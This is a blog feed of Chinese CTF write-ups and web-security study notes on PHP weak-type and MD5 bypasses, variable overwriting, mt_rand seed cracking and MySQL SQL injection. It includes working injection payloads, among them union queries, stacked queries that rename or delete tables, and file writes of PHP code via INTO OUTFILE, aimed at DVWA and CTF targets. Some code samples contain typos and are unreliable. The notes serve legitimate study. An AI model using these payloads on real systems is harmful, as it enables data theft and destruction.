&#123;&quot;乾&quot;: &quot;111&quot;, &quot;兑&quot;: &quot;011&quot;, &quot;离&quot;: &quot;101&quot;, &quot;震&quot;: &quot;001&quot;, &quot;巽&quot;: &quot;110&quot;, &quot;坎&quot;: &quot;010&quot;, &quot;艮&quot;: &quot;100&quot;, &quot;坤&quot;: &quot;000&quot;&#125;encoded_text = &quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot;text = &#39;&#39;binary_text = &quot;&quot;for char in encoded_text:    binary_text += _hash[char]formatted_binary_text = &quot; &quot;.join(binary_text[i:i+10] for i in range(0, len(binary_text), 10))print(formatted_binary_text)# 0001110111 0001101000 0000110001 0001100011 0001101000 0001011111 0001100001 0001100111 0000110100 0001101001 0001101110 0001011111 0001110000 0001110010 0000110000 0001100100 0001110101 0001100011 0001100101 0001100100 0001011111 0001110100 0001101000 0001100101 0001011111 0000110011 0001101001 0001100111 0001101000 0001110100 0001011111 0001010100 0001110010 0000110001 0001100111 0001110010 0001100001 0001101101 0001110011</code></pre><p>拿到在线二进制转文本工具中 得到flag内的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524094505475.png" alt="image-20230524094505475"></p><p>NSSCTF{wh1ch_ag4in_pr0duced_the_3ight_Tr1grams}</p><h3 id="ssvvgg"><a href="#ssvvgg" class="headerlink" title="ssvvgg"></a>ssvvgg</h3><p>010editor打开发现base64  可以讲base64解码后在单独保存为一个文件 也可以找个工具直接梭 将base64转为图片</p><p><a href="base64%E8%BD%AC%E5%9B%BE%E7%89%87">https://feling.net/base64/</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524154633930.png" alt="image-20230524154633930"></p><p>保存为1.png</p><p>在图片尾部提示使用steghide 且密码为六位数字</p><p>使用sh脚本爆破可以得到密码为666666</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524173026457.png" alt="image-20230524173026457"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web实训技能听课笔记(持续更新中)</title>
      <link href="/2023/05/16/web%E5%AE%9E%E8%AE%AD%E6%8A%80%E8%83%BD%E5%90%AC%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/05/16/web%E5%AE%9E%E8%AE%AD%E6%8A%80%E8%83%BD%E5%90%AC%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="web实训技能听课笔记-持续更新中"><a href="#web实训技能听课笔记-持续更新中" class="headerlink" title="web实训技能听课笔记(持续更新中)"></a>web实训技能听课笔记(持续更新中)</h1><h2 id="web新手村"><a href="#web新手村" class="headerlink" title="web新手村"></a>web新手村</h2><p>1.请从本地访问——IP地址欺骗——添加类似X-Forwarded-For: 127.0.0.1等信息</p><p>2，请从google.com访问——添加Referer头 类似Referer: google.com</p><p>3.请使用ABC Browser——添加User-Agent(通过这个来判断访问使用的浏览器 也可以识别出是手机浏览器还是计算机浏览器) 类似User-Agent: ABC Browser</p><p>4.webshell——蚁剑——URL地址填环境名——找连接密码</p><p>5.弱类型</p><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候 会先判断两种字符串的类型是否相等 在比较‘</p><p>&#x3D;&#x3D; 在进行比较的时候 会先将字符串类型转化成相同 在比较</p><p>(如果比较一个数字和字符串或者比较涉及到数字内容的字符串 则字符串会被转换成数值并且比较按照数值来进行)</p><p>eg. </p><pre><code class="php">var_dump(&quot;admin&quot;==0); //truevar_dump(&quot;1admin&quot;==1); //truevar_dump(&quot;admin1&quot;==1); //falsevar_dump(&quot;admin1&quot;==0); //truevar_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true</code></pre><p><font color="red">在识别字符串的每一个字符时 由左到右依次识别 第一次识别到字母的时候 后面会全部忽略 且判定为0</font></p><p><font color="red">“e”在php中识别为10的多少次方 是科学计数法 所以最后一个例子 0*10的多少次方都是0 故返回true</font></p><p>当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含<font color="red">‘.’  ‘,’  ‘e’ “E”</font>并且其数值值在整形的范围之内 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。且由于被判断为非法数值 后面的内容也不在考虑是否含有”.” “,” “e” “E”</p><pre><code class="php">&lt;?php.$test=l + &quot;10.5&quot;;  // $test=11.5(float)$test=1+&quot;-1.3e3&quot;; //$test=-1299(float)$test=l+&quot;bob-1.3e3&quot;; //$test=1(int)$test=l+&quot;2admin&quot;; //$test=3(int)$test=l+&quot;admin2; //$test=1(int)?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230425090540.jpg" alt="微信图片_20230425090540"></p><h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><p>基础的 登陆的哈希验证</p><p>一.</p><pre><code class="php">$a != $bMd5($a) == Md5($b)</code></pre><p>要求传入两个不相等的字符串 但要求两个字符串的md5值一样</p><p>看到”&#x3D;&#x3D;” 想到弱类型判断 可以传入 两个md5值是”0e”开头的字符串 这 样会被识别为科学计数法 判断为0 所以md5值也一样</p><p>二.</p><pre><code class="php">$a != $bMd5($a) === Md5($b)</code></pre><p>md5()只能计算字符串(string)的MD5值 但是数组就不行了 返回值是null</p><p>可以利用null &#x3D;&#x3D;&#x3D; null来进行绕过 只要保证两个数组里面的内容不一样就可以了</p><pre><code class="php">a[]=1&amp;b[]=2</code></pre><p>三.</p><pre><code class="php">(string)$a != (string)$bMd5($a) === Md5($b)</code></pre><p>利用MD5碰撞 两个不同的东西会有相同的MD5</p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><p>四.</p><pre><code class="php">$md5 == md5($md5)</code></pre><p>积累内容</p><p>五.</p><pre><code class="php">intval($num) &lt; 2020 &amp;&amp; intval($num+1) &gt; 2021</code></pre><p>和php版本有关 php5会将对科学计数法取int 以常规字符串中数字和字母组合的方式识别出</p><p>但是先加一在取int 则不会</p><pre><code class="php">$num = 2e5intval($num); //2intval($num+1); //200001</code></pre><p>六.</p><p>浮点精度绕过</p><p><a href="http://172.30.211.91:8343/">http://172.30.211.91:8343/</a> Africa</p><pre><code class="php">$numPositive = intval($num)$numReverse = intval(strrev($num))l; //strrev就是逆序$num != $numPositive$numPositive === $numReverse &amp;&amp; !isPalindrom($num); //isPalindrom返回一个数的回文数 比如123回文数是321</code></pre><p>要求取整后的数和逆序后取整的数相等 且传入的num不能是回文数</p><p>最后一个条件很好满足 比如100.0010</p><p>但是在读取100.0010时 读完整数部分 遇到小数部分的0就会停止 识别为100 结果和取整是一样的</p><p>而逆序数0100.001取整还是100所以条件二满足了</p><p>条件一下面返回的是die 所以要求我们输入的num不能满足条件一对应的if条件 即应该是$num &#x3D;&#x3D; $numPositive</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230425151321618.png" alt="image-20230425151321618"></p><p>使用浮点精度绕过</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230425151809409.png" alt="image-20230425151809409"></p><p>由图可知 在小数点后16位 会超出php语言所能识别的精度 将1.0000000000000001判断为与1相等</p><p>因此 为了满足条件一二  我们应该输入的$num &#x3D; 1000000000000000.00000000000000010</p><p>七.</p><pre><code class="php">$md5 == md5(md5($md5))</code></pre><p>积累 跑脚本可以得出为0e1138100474 其实在前面加n个0也的满足的</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="Extract"><a href="#Extract" class="headerlink" title="Extract()"></a>Extract()</h3><p><strong>定义：</strong>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。</p><p><strong>语法：</strong></p><p>extract(<em>array,extract_rules,prefix</em>)<br> 参数                                              描述<br> <em>array</em>必需。                         规定要使用的数组。<br> <em>extract_rules</em>可选。             extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br> 可能的值：<br> EXTR_OVERWRITE -        默认。如果有冲突，则覆盖已有的变量。<br> EXTR_SKIP -                     如果有冲突，不覆盖已有的变量。<br> EXTR_PREFIX_SAME -    如果有冲突，在变量名前加上前缀 prefix。<br> EXTR_PREFIX_ALL -        给所有变量名加上前缀 prefix。<br> EXTR_PREFIX_INVALID -仅在不合法或数字变量名前加上前缀 prefix。<br> EXTR_IF_EXISTS -           仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br> EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br> EXTR_REFS -                        将变量作为引用提取。导入的变量仍然引用了数组参数的值。</p><p><em>prefix</em>可选。                         如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。<br> 该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p><pre><code class="php">//将键值&quot;cat&quot;、&quot;dog&quot;、&quot;horse&quot;赋值给变量$a $b $c&lt;?php$a = &quot;original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;cat&quot;,&quot;b&quot; =&gt; &quot;dog&quot;,&quot;c&quot; =&gt; &quot;horse&quot;);extract($my_array);echo &quot;\$a = %a; \$b = $b; \$c = $c&quot;;?&gt;//$a = %a; $b = dog; $c = horse</code></pre><p>就是说 extract()使用了一个数组$my_array(其中<strong>array</strong>函数是用来创建数组的) 将其中的三个键值对 分别导入 </p><p>如果其中某个键名($a)存在且原来有内容 则extract函数会对其进行覆盖 </p><p>如果没有($b、$c) extract函数会创建这个键名并且将数组中键名对应的键值导入其中</p><p><strong>再举一个例子</strong></p><pre><code class="php">&quot;extract($_GET);if(isset($bdctf))&#123;$content=trim(file_get_contents($flag));//file_get_contents()将整个文件读入一个字符串if($bdctf==$content)                             //trim()去除字符串首尾处的空白字符（或者其他字符）&#123; echo&#39;bdctf&#123;**********&#125;&#39;; &#125;else&#123; echo&#39;这不是蓝盾的密码啊&#39;; &#125;&#125;&quot;</code></pre><p><strong>题目分析</strong><br>题目使用了**extract($_GET)<strong>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p><p><strong>解题思路</strong><br> if($bdctf&#x3D;&#x3D;$content) 输出flag<br> 利用<strong>extract($_GET)漏洞，使$bdctf与$content都为空或者不存在就满足 $bdctf&#x3D;&#x3D;$content</strong><br> <strong>get?flag&#x3D;&amp;bdctf&#x3D;  得到flag</strong></p><h3 id="Parse-str"><a href="#Parse-str" class="headerlink" title="Parse_str"></a>Parse_str</h3><p><strong>定义：</strong></p><p>把查询字符串解析到变量中</p><p><strong>语法：</strong></p><p><strong>parse_str(string,array)</strong><br>参数 描述<br><em>string</em>必需。 规定要解析的字符串。<br><em>array</em>可选。 规定存储变量的数组名称。该参数指示变量存储到数组中。</p><pre><code class="php">&lt;?php$a = 1;                  //原变量值为1parse_str(&#39;a=2&#39;);   //经过parse_str()函数后注册变量$a，重新赋值print_r($b);          //输出结果为2?&gt;</code></pre><p><strong>举个例子</strong></p><pre><code class="php">&lt;?phpif(!isset($_GET[&#39;id&#39;])) &#123;                    show_source(__FILE__);          die;                                          &#125;include (‘flag.php’);$a = “www.OPENCTF.com”;$id = $_GET[&#39;id&#39;];@parse_str($id);if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;echo $flag;&#125; else &#123;exit(‘其实很简单其实并不难！’);&#125;?&gt;</code></pre><p><strong>题目分析</strong></p><p>首先 看到存在哈希比较 且是”&#x3D;&#x3D;”的弱比较 要求$a[0]的值不等于‘QNKCDZO’ 但是MD5值等于 </p><p>解一下可以发现 ‘QNKCDZO’的MD5值正好是<strong>0e830400451993494058024219903391</strong>可以进行哈希绕过 </p><p>随便找一个满足要求的字符串 比如<strong>s878926199a</strong> 其MD5值也是0e开头的 和 ‘QNKCDZO’的MD5值一样 都会被识别为0(科学计数法)</p><p>$id接受了get请求中的数据 而parse_str函数接受了$id 只要将数组a的值赋予$id 就可以成功覆盖$a[0] 满足题目要求的判断条件</p><p><strong>get?id&#x3D;$a[0]&#x3D;s878926199a</strong></p><h2 id="随机数问题"><a href="#随机数问题" class="headerlink" title="随机数问题"></a>随机数问题</h2><p>**mt_rand()**种子</p><p>mt_rand()函数用于生成随机数</p><p>mt_srand(seed)给随机数发生器播种 比如：</p><pre><code class="php">&lt;?phpmt_srand(123456);echo mt_rand();?&gt;//272665632</code></pre><p>原理就是 对于给定种子的随机数发生器 他计算出的随机数都是一样的 这样根据得到的随机数 我们可以使用<strong>php_mt_seed</strong>(在kali里面)脚本爆破出使用的种子 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230428103219947.png" alt="image-20230428103219947"></p><p>同时 根据php使用的版本不同 爆破出来的种子也不一样 按照不同题目可能两个都要试一下</p><p>此外  还有一种无需爆破得到种子的脚本 reverse_mt_rand.py</p><pre><code class="python">./reverse_mt_rand.py rand_n+0 rand_n+227 n flavour# rand_n+0 是选择的第一个随机数# rand_n+227 是选择的第二个随机数 第一二个随机数之间要间隔226个随机数# n的值是相对于最开始生成的第一个随机数 我们选择的第一个随机数是第几个数# flavour 如果是php5版本 就输入0 如果是php7以上的版本就输入1</code></pre><h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><p>数据库就是软件存放数据的一个空间</p><p>**数据库管理系统(DBMS)**是一种操纵和管理数据库的软件 用于建立使用和维护数据库 他对数据库进行统一的管理和控制 以保证数据库的安全性和完整性  <strong>mysql</strong>就是这样的一种数据库管理系统</p><p>主要分为两类：关系型数据库和非关系型数据库</p><p><strong>关系型数据库</strong>RDBMS:存储格式能直观反映实体间的关系 和创建的表格比较相似 表与表之间有着复杂的关联关系 比如 mysql oracle server access等</p><p><strong>非关系型数据库</strong>：分布式、非关系型的、不保证遵循ACID原则的数据存储系统 比如 mongodb redis hbase等</p><p><strong>SQL</strong> 结构化查询语言 </p><p>查询是人们用各种SQL指令构造出来的 负责具体完成筛选和提取结果数据的工作 包括增删改查</p><h2 id="Mysql基础"><a href="#Mysql基础" class="headerlink" title="Mysql基础"></a>Mysql基础</h2><p>数据类型：大致可以分为 数值、日期&#x2F;时间和字符串类型</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230502124537303.png" alt="image-20230502124537303"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230501203846050.png" alt="image-20230501203846050"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230501203952345.png" alt="image-20230501203952345"></p><p><strong>约束类型</strong>：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230502124343739.png" alt="image-20230502124343739"></p><h3 id="常见的sql语句"><a href="#常见的sql语句" class="headerlink" title="常见的sql语句"></a><strong>常见的sql语句</strong></h3><p><strong>连接</strong>数据库：mysql -uroot -p；</p><p>**查询(显示)**所有的数据库：show databases；</p><p><strong>创建</strong>数据库：create database 库名；</p><p><strong>删除</strong>数据库：drop database 库名;</p><p><strong>查看(显示)<strong>当前数据库的所有表：show tables; 在用之前 要选择</strong>使用(打开)<strong>一个数据库</strong>use db_name</strong>；</p><p><strong>查看</strong>某个表的**描述(结构)**：desc 表名；</p><p>显示表中各<strong>字段信息</strong>，即表结构：show columns from table_name;</p><p>显示<strong>表创建过程</strong>：show create table 表名；</p><p>列出当前<strong>mysql的相关状态信息</strong>：status;</p><p><strong>清空</strong>数据表：delete from table_name; </p><p>或truncate table table_name;</p><p><strong>退出</strong>数据库：exit；</p><p>查询现在<strong>正在使用</strong>的数据库：select database();</p><p>操作：增减改查</p><p><strong>增</strong>：语法格式：insert into 表名（字段1，字段2，。。。。）values（值1，值2，。。。。）;</p><p>是一一对应的</p><p>插入多条数据：insert into 表名（字段1，字段2，。。。。）values（值1，值2，。。。。），（值3，值4，。。。。）;</p><pre><code class="mysql">insert into test(id,name,age) values(1,&#39;wenx1&#39;,18);</code></pre><p><strong>改</strong>：update 表名 set 字段名&#x3D;’值’ [where条件]</p><pre><code class="mysql">update test set age=&#39;28&#39; where id=1;</code></pre><p><strong>查</strong>：select * from 表名 [where条件]；</p><pre><code class="mysql">select * from test;   #*表示查询这张表中的全部字段(列)select GROUP_CONCAT(NAME,Population) from city where CountryCode=&#39;PSE&#39;;  #GROUP_CONCAT能将查询到的所有内容放在同一行 用“，”来区分</code></pre><p><strong>order by排序</strong></p><p>格式：select * from 表名 order by 列名(字段名)  </p><p>order by ｛column_name [ASC|DESC]} [,….n]   ASC为升序 DESC为降序   若后面加数字表示以第几列为基准做排序</p><p>特性：如果order by后的数字超过了原有的字段数(列数) 就会报错(可以用来sql注入里面猜当前数据表中有多少个字段)</p><pre><code class="mysql">select * from city order by ID asc;#假设当前数据表中有5个字段select * from cuty order by 5; #不会报错select * from cuty order by 6; #会报错</code></pre><p><strong>limit限制</strong></p><p>用于限制select语句返回指定的记录数 接受一个或两个数字参数</p><p>语法：select * from 表名 limit 偏移量，限制条数 </p><pre><code class="mysql">limit 5; #5代表限制条数limit 0,5; #0代表偏移量，5代表限制条数select * from table limit 5; #检索前5个记录行select * from table limit 5,10; #检索记录行6-15 注意在有偏移量的时候 从偏移量的下一行开始算限制条数</code></pre><p><strong>减</strong>：delete 表示删除一条数据 指的是物理删除 彻底在数据库中删除了  对比是逻辑删除 只是不显示在系统中 但数据库中依旧存在</p><p>delete from 表名 [where条件]</p><pre><code class="mysql">delete from test where id=1; #物理删除 update是逻辑删除</code></pre><p><strong>注释符</strong>：</p><pre><code class="mysql">#--+ 或 --空格/*.......*/</code></pre><p>其他操作：</p><pre><code class="mysql">select version(); / select @@version; #查看版本信息select user(); #返回当前使用数据库的用户 也就是网站配置文件中连接数据库的账号select session_user(); #查看连接数据库的用户名select system_user(); #查看系统用户名select database(); #查看当前数据库group_concat(); #把数据库中的某列数据或某几列数据合并为一个字符串select @@datair; #查看数据库路径</code></pre><p> <strong>information_schema</strong></p><p>mysql自带的数据库 可以提供mysql服务器所维护的所有其他数据库的信息 如数据库名 数据库的表 表的数据类型与访问权限等</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>就是将sql代码插入或添加到应用的输入参数中的攻击 之后再将这些参数传递给后台的sql服务加一解析并执行</p><p>产生条件：攻击者控制了sql语句的一部分 使用户的输入不再是一个输入参数 而成为了符合语法的sql语句</p><p>按回显方式划分：</p><p>有回显：</p><p>联合查询：构造联合查询语句 直接查看查询结果</p><p>报错注入：构造报错语句 在报错中查看结果</p><p>堆查询：多航语句执行 进而实现想要达到的目的</p><p>无回显：</p><p>盲注：布尔型&#x2F;时间型 通过某种手段“爆破”结果</p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>使用DVWA进行sql注入联合查询测试</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230510090242654.png" alt="image-20230510090242654"></p><p>一.输入1</p><p>此时的sql语句为</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39;    # 返回用户id为1的用户数据</code></pre><p>二.输入 1’ and ‘1’ &#x3D; ‘2</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; and &#39;1&#39; = &#39;2&#39;  # 此时判断结果恒为假 无法测试出是否含有sql注入</code></pre><p>三.输入1’ or ‘1234’ &#x3D; ‘1234</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; or &#39;1234&#39; = &#39;1234&#39;  # 条件判断恒为真 返回users表中的所有用户数据</code></pre><p>四.输入1’ or 1&#x3D;1 order by 1 #<strong>(这里的#是为了把sql语句中后面的单引号注释掉)</strong></p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; or 1=1 order by n #   # 用order by语句来猜测表中有多少字段 若报错 则说明字段数为n-1</code></pre><p>五.输入1’ union select 1,2 #</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; union select 1,2 #   # 确定显示的字段顺序(可能出现有5个字段 但是只回显2个字段的情况)</code></pre><p>六.获取当前数据库中的情况</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; union select 1,databases() #    # 获取当前的数据库名select first_name, last_name from users where user_id = &#39;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #    # 获取当前数据库的表名 select first_name, last_name from users where user_id = &#39;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #       # 获取当前表中的字段名select first_name, last_name from users where user_id = &#39;1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #    # 查询数据</code></pre><p>其中**group_concat()**的作用就是将多行的数据在一行进行输出 并且用”,”分开    如果限制使用group_concat()就用limit 使用方法在上面常见的sql语句中</p><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>是一个信息数据库 保存着mysql服务器所维护的所有其他数据库的信息 比如数据库的名 数据库的表 表栏的数据类型与访问权限等 在其中 有数个只读表 它们实际上是视图 而不是基本表</p><p><font color="red"><strong>schemata表</strong></font></p><p>提供了当前mtsql实例中所有数据库的信息 show databases()的结果取于此表</p><p><font color="red"><strong>tables表</strong></font></p><p>提供了关于数据库中的表的信息 show tables from schemaname的结果取于此表</p><p><font color="red"><strong>columns表</strong></font></p><p>提供了表中字段的信息 show columns from schemaname.tablename的结果取于此表</p><p><strong>联合查询常用套路：</strong></p><p>1.orde by 猜列数(字段数)</p><p>2.union select 1,2,3,…,n n为上一步猜出来的列数  </p><p>3.查看哪几列回显出来了 比如有3列 其中2、3列回显了 1列没有回显 则可以输入union select database(),2,3; 用database()代替回显不出来的第一列 即可查询到数据库名</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>mysql服务器维护着两种变量 <strong>全局变量</strong>影响服务器的全局操作 <strong>会话变量</strong>影响具体客户端连接相关操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/MySQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E5%A0%86%E5%8F%A0%E6%88%AA%E5%9B%BE__2023-05-11-20-45-16.png" alt="MySQL文件操作、宽字节、堆叠截图__2023-05-11-20-45-16"></p><p>可以使用show variables语句查看系统变量及其值</p><p>可以使用like进行匹配和筛选</p><pre><code class="mysql">show variables like &quot;a%&quot;  # 筛选以&quot;a&quot;开头的系统变量</code></pre><h4 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h4><p>对文件读写有影响</p><p>其参数是用来限制load data,select ….,outfile, load_file()等传到那个指定目录</p><p>当其值为null时 表示限制mysql不允许导入&#x2F;导出 *<em>默认是null</em></p><p>当其值为&#x2F;tmp&#x2F;时 表示限制mysql的导出&#x2F;导入只能发生在&#x2F;tmp&#x2F;下</p><p>当其为空值时 表示不对mysql的导入&#x2F;导出作出限制</p><p><strong>mysql读文件</strong></p><pre><code class="mysql">select load_file(&#39;文件名&#39;);select convert(load_file(&quot;文件路径&quot;) using utf8);</code></pre><p><strong>mysql写文件</strong></p><pre><code class="mysql">select &quot;&lt;php phpinfo();?&gt;&quot;(字符串) into outfile &quot;路径&quot;select &quot;&lt;php phpinfo();?&gt;&quot;(字符串) info dumpfile &quot;路径&quot;</code></pre><p><strong>outfile</strong>函数可以导出多行 而<strong>dumpfile</strong>只能导出一行数据</p><p><strong>outfile</strong>函数在将数据写到文件里是有特殊的格式转换 而<strong>dumpfile</strong>则保持原数据格式</p><p>比如原字符串中含有表示换行符的字符(0a)outfile会将其转化为\ 在输出 而dumpfile则直接输出原内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/MySQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E5%A0%86%E5%8F%A0%E6%88%AA%E5%9B%BE__2023-05-11-21-11-53.png" alt="MySQL文件操作、宽字节、堆叠截图__2023-05-11-21-11-53"></p><p><strong>当然 这里的一切建立在secure_file_priv的值不为null的情况下  当其值为null的时候 想要进行文件读写 需要利用下面说到的堆叠注入</strong></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>注意 通常多条语句执行时，若前条语句已返回数据 则之后的语句返回的数据通常无法返回前端页面 建议使用union联合注入 若无法使用联合注入 可考虑使用rename关键字 将想要的数据列名&#x2F;表名更改成返回数据的sql语句所定义的表&#x2F;列名(在下面强网杯的例题中有所体现)</strong></p><p>使用条件 API或者数据库引擎支持多条语句同时注入 即</p><pre><code class="mysql">multi_query($sql);</code></pre><p>mysql可以执行多条语句 多条语句之间用”;”做分隔 </p><p>因为分号为mysql语句的结束符 若在支持多条语句执行的情况下 可以利用此方法执行其他恶意语句 比如rname、drop、delete等 <strong>堆叠注入可以用于执行任何sql语句</strong></p><p>举个例子：执行查询时。第一个语句执行信息查询，第二个语句则将表user的所有内容删除了</p><pre><code class="mysql">select * from users where id=1;delect from users;</code></pre><p><strong>以2019年强网杯随便注为例</strong></p><p>**1.**在题目源码过滤了select等语句的时候 可以使用handler语句 他允许我们一行一行的浏览一个表中的数据 </p><p>使用格式：</p><pre><code class="mysql">handler users open as hh; #指定数据表进行载入并返回句柄handler hh read first; #读取指定句柄的第一行数据handler hh read next; #读取指定句柄的下一行数据handler hh close; #关闭句柄</code></pre><p>也可以不给表指定命名为句柄 就用表名即可</p><p>2.首先输入 <code>1</code>是有回显的</p><p>2.输入 <code>1&#39; and 1=2#</code>发现没有回显任何信息 说明存在sql注入</p><p>3.在输入<code>1‘ union select 1;</code>尝试进行联合查询 发现题目过滤掉了select update drop insert where等语句</p><p>4.使用堆叠注入</p><p><code>1&#39;; show tables</code>回显了当前数据库中的表的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512154010134.png" alt="image-20230512154010134"></p><pre><code class="mysql">1&#39;; show columns from `1919810931114514`;#</code></pre><p>回显了1919810931114514数据库中字段的信息 发现了flag</p><p>5.过滤了select 但是可以使用handler查看字段信息</p><pre><code class="mysql">1&#39;; handler `1919810931114514` open;handler `1919810931114514` read first;#</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512154607756.png" alt="image-20230512154607756"></p><p>得到flag{4a26eacf-123d-448e-933e-0535258f3e46}</p><p><strong>解法二：rename改名</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512160357171.png" alt="image-20230512160357171"></p><p>对于输入1的时候 回显的这部分信息 再加上用handler语句查看的words表中的第一行数据和回显的信息一致 以及查看到words中含有的字段为id和data 猜测其对应的查询语句 可能为 <code>select * from words where id=&#39;$id&#39;</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512170918760.png" alt="image-20230512170918760"></p><p>即网站源代码中存在的语句是查询名为”words”的表中名为”id”的字段对应的数据</p><p>所以可以将”1919810931114514”表的名字改为”words”将”flag”字段的名字改为”id” 就可以查询到”flag”字段中的信息了</p><pre><code class="mysql">1&#39;;rename table `words` to `words2`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not null;#</code></pre><p>在输入 <code>1&#39; or 1=1#</code>就可以查询到flag了</p><p><strong>解法三：mysql预处理</strong></p><p>原理是因为题目过滤了select关键字 所以定义一个函数 用s和elect来拼接成select 在进行使用 </p><pre><code class="mysql">1&#39;;prepare st from concat(&#39;s&#39;,&#39;elect&#39;, &#39;* from `1919810931114514`&#39;);execute st;#</code></pre><p>直接查询出flag</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>字符集</strong>，也叫字符编码 是一种将符号转换为二进制数的映射关系</p><p>常见的字符集：ASCII编码：单字节编码</p><p>latin1编码：单字节编码</p><p>gbk编码：使用单字节和双字节编码</p><p>UTF-8编码：使用一到四字节编码</p><p><strong>宽字节</strong>就是两个以上的字节 <strong>宽字节注入产生的原因就是各种字符编码的不当操作 使得攻击者可以通过宽字节编码绕过sql注入防御</strong></p><p>通常来说 一个gbk编码汉字 占用2字节 一个utf-8编码汉字 占用3个字节 </p><pre><code class="php">echo strlen(&quot;和&quot;)</code></pre><p>当页面保存为gbk时输出2 